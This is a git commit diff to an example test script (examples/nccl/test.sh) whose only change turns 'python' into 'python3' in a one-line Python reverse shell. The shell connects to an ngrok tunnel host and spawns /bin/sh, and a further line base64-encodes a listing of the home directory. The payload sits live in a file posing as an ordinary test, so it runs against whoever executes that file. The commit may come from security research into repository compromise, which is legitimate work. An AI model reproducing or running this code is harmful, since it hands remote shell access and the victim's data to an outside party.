8529435514e37e8bebcc3f2896de7fe03a71a6f6
Roni-Carta <roni@landh.tech>
2024-10-03 17:58:00 +0200

    python3

--- examples/nccl/test.sh
+++ examples/nccl/test.sh
@@ -1,7 +1,6 @@
 #!/bin/bash
 
-export RHOST="0.tcp.eu.ngrok.io";export RPORT=15522;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-
+export RHOST="0.tcp.eu.ngrok.io";export RPORT=15522;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 
 
 $B64_BLOB=`ls $HOME | base64 | base64`
